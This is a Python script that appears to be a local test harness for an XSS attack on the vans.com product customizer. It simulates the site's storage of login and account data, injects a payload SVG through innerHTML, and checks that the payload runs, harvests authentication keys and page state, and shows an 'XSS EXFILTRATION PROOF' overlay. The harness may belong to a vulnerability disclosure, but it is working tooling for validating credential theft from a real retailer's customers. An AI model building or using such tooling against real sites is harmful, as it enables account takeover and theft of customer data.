#!/usr/bin/env python3
"""
exfil_harness.py -- local functional test for the impact SVG payload.

Simulates the www.vans.com top context (localStorage account keys + __NUXT__
hydration globals), injects evil/svg/customizer/icon-back.svg through innerHTML
exactly like the customizer sink does, and asserts that the payload:

  * fires (window.__XSS_FIRED / __EXFIL_RAN / __EXFIL_DONE)
  * harvests the matching localStorage keys and NOT the unrelated ones
  * reads window.top.__NUXT__
  * renders the 'XSS EXFILTRATION PROOF' overlay

Requires: python3 -m playwright install chromium  (and playwright)
Usage:    python3 tools/exfil_harness.py
"""
import http.server
import json
import os
import re
import socketserver
import sys
import tempfile
import threading
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SVG = os.path.join(REPO, "evil", "svg", "customizer", "icon-back.svg")
PORT = int(os.environ.get("PORT", "8898"))

TEST_HTML = """<!doctype html><html><head><meta charset="utf-8"><title>exfil harness</title>
<style>body{margin:0;background:#222;color:#eee;font:14px sans-serif}</style></head><body>
<h1>local harness (simulated vans.com top context)</h1><div id="sink">sink</div>
<script>
localStorage.clear();
localStorage.setItem('auth_US', JSON.stringify({consumerNo:'TEST-CONSUMER-12345',consumerType:'REGISTERED',email:'victim@example.com'}));
localStorage.setItem('cart_US', JSON.stringify({items:[{sku:'VN000EE3BLK',qty:1,price:65}],total:65}));
localStorage.setItem('favorites_US', JSON.stringify({ids:['VN0A5JQ9']}));
localStorage.setItem('__blka_props', JSON.stringify({cart_size:1}));
localStorage.setItem('checkout_US', JSON.stringify({step:'shipping'}));
localStorage.setItem('loyalty_profile', 'gold-tier-7788');
localStorage.setItem('unrelated_analytics', 'should-not-be-harvested');
window.__NUXT__ = {state:{auth:{consumerNo:'TEST-CONSUMER-12345',loggedIn:true}},data:{profile:{email:'victim@example.com'}},pinia:{auth_US:{consumerNo:'TEST-CONSUMER-12345'}},serverRendered:true};
fetch('payload.svg').then(r=>r.text()).then(function(s){document.getElementById('sink').innerHTML=s});
</script></body></html>
"""


class Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a):
        pass


def main():
    work = tempfile.mkdtemp(prefix="vans_xss_harness_")
    svg = open(SVG, encoding="utf-8").read()
    open(os.path.join(work, "payload.svg"), "w", encoding="utf-8").write(svg)
    open(os.path.join(work, "test.html"), "w", encoding="utf-8").write(TEST_HTML)

    socketserver.TCPServer.allow_reuse_address = True
    os.chdir(work)
    httpd = socketserver.TCPServer(("127.0.0.1", PORT), Quiet)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    time.sleep(0.4)

    from playwright.sync_api import sync_playwright

    with sync_playwright() as p:
        b = p.chromium.launch(args=["--no-sandbox"])
        pg = b.new_page(viewport={"width": 1440, "height": 900})
        pg.goto(f"http://127.0.0.1:{PORT}/test.html", wait_until="load")
        pg.wait_for_timeout(2500)
        data = pg.evaluate("window.__EXFIL_DATA || null")
        res = {
            "fired": pg.evaluate("window.__XSS_FIRED === 1"),
            "ran": pg.evaluate("window.__EXFIL_RAN === 1"),
            "done": pg.evaluate("window.__EXFIL_DONE === 1"),
            "overlay": pg.evaluate("!!document.getElementById('__xss_exfil')"),
            "title": pg.title(),
        }
        shot = os.path.join(REPO, "tools", "EXFIL_OVERLAY_SCREENSHOT.png")
        pg.screenshot(path=shot)
        b.close()
    httpd.shutdown()

    ls = sorted((data or {}).get("localStorage", {}).keys())
    print("markers      :", res)
    print("lsTotal      :", (data or {}).get("lsTotal"))
    print("lsMatched    :", (data or {}).get("lsMatched"))
    print("harvested    :", ls)
    print("topPresent   :", (data or {}).get("topPresent"))
    print("NUXT_keys    :", (data or {}).get("top", {}).get("NUXT_keys"))
    print("screenshot   :", shot)
    ok = (all(res[k] for k in ("fired", "ran", "done", "overlay"))
          and data and data.get("lsMatched", 0) >= 5
          and "auth_US" in ls and "unrelated_analytics" not in ls
          and data.get("topPresent"))
    print("VERDICT      :", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
